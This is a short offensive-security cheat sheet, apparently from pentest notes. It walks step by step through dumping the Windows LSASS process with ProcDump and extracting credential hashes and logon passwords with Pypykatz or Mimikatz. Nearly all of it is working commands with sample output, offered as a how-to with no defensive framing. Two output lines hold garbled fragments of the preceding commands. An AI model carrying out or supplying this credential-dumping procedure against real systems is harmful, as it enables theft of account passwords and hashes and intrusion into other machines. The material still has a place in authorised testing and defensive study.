# Dump LSASS process and parse it with Pypykatz/Mimikatz


1. Locate the PID of the lsass.exe process.

```bash
PS C:\> tasklist /fi "imagename eq lsass.exe"
akit/i"mgnm qlasee
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      564 Services                   0     45,456 K
```

2. Dump the process to a file with ProcDump

```bash
PS C:\> .\procdump64.exe -accepteula -ma 564 lsass.dmp
\rcup4ee-cpel m 6 ssdp
ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[14:20:38] Dump 1 initiated: C:\lsass.dmp
[14:20:38] Dump 1 writing: Estimated dump file size is 46 MB.
[14:20:38] Dump 1 complete: 46 MB written in 0.1 seconds
[14:20:38] Dump count reached.
```

3. Install Pypykatz.

```bash
sudo pip3 install pypykatz  
```

4. Run pypykatz to parse the dump and get hashes.

```bash
pypykatz lsa minidump lsass.dmp
```

Or via Mimikatz 

```bash
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```
